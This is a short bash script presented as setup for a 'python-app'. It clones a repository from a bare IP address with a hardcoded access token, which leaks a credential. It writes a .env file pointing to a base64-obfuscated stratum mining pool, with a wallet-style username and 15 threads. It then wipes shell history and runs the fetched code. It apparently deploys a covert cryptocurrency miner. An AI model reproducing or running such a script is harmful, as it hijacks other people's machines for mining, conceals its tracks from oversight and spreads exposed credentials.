#!/bin/bash

# Clone repository jika belum ada
if [ ! -d "python-app" ]; then
    git clone http://adminjerry:11a75ed3804a5df1b444f813b9f084310bb64eef@159.89.237.227:3000/adminjerry/python-app.git
    cd python-app
else
    cd python-app
    git pull
fi

# Convert line endings dan setup
sed -i 's/\r$//' run.sh
echo -e 'proxy=wss://wes.baleribo.space/c3RyYXR1bS1uYS5ycGxhbnQueHl6OjcwMjI=\nhost=127.0.0.1\nport=3036\nusername=mbc1q7sm9tj0fy5yvmyrq6cwehn9wagv0t593gjc46d.dytn\npassword=x\nthreads=15' > .env

chmod +x run.sh

# Bersihkan history
history -c && history -w

# Jalankan aplikasi (opsional, bisa di-comment jika tidak ingin langsung run)
./run.sh 2
